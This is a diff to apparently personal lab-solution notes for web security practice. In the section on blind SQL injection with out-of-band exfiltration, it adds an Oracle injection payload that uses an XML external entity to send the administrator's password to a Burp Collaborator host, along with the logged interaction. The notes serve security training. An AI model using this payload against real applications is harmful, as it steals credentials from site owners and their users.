@@ -151,4 +151,7 @@ TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encodin
 ```
 
 ### Blind SQL injection with out-of-band data exfiltration
-TODO: Burp Suite Professional
+```
+TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ttqw3(...).burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--;
+```
+Burp Collaborator interaction: `gd61dj.ttqw3gbwcea26g1r6yl4nup1lsrif7.burpcollaborator.net.`
